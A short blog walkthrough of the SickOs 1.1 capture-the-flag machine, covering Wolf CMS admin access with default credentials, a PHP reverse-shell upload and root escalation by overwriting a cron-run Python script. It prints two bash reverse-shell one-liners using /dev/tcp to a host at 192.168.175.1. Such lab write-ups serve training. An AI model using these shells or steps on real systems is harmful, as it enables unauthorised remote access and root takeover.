---
published: true
layout: post
---
[SickOs: 1.1](https://www.vulnhub.com/entry/sickos-11,132/) is a vulnerable machine with an objective to get root and read file /root/a0216ea4d51874464078c618298b1367.txt


To get VM's IP I used nmap
	
![]({{site.baseurl}}/images/sickos1.png)

Output gave me information that VM runs http proxy. I configured Firefox to use it and tried to access VM's localhost. 

![]({{site.baseurl}}/images/sickos2.png)

I succeeded and noticed a simple website. I tried robots.txt and found out that there is Wolf CMS run under /wolfcms

![]({{site.baseurl}}/images/sickos3.png)

I asked google for some information about Wolf CMS and found two directories used for installation process - /install and /docs. I tried both but only /docs was available. In file http://localhost/wolfcms/docs/install.txt I found default credentials, but I didn't know where to put them. I went to google again and searched for URL to admin panel which occurred to be http://localhost/wolfcms/?/admin/login.
Default credentials worked and I got access to administration panel.

![]({{site.baseurl}}/images/sickos4.png)

From this place I was able to upload reverse shell and connect to VM.

	<?php
	exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.175.1/8888 0>&1'");
	?>

After I got access to shell and started investigation what this machines does. I found that there is a cron running python script as root every minute. Fortunately I had permission to overwrite this file.

![]({{site.baseurl}}/images/sickos5.png)

I uploaded reverse shell again, but this time written in python.

	#!/usr/bin/python
	import os
	os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.175.1/9999 0>&1'")

I used existing shell to overwrite script with uploaded one, then I ran netcat on port 9999 and waited one minute until I got root shell.

![]({{site.baseurl}}/images/sickos6.png)

![]({{site.baseurl}}/images/sickos7.png)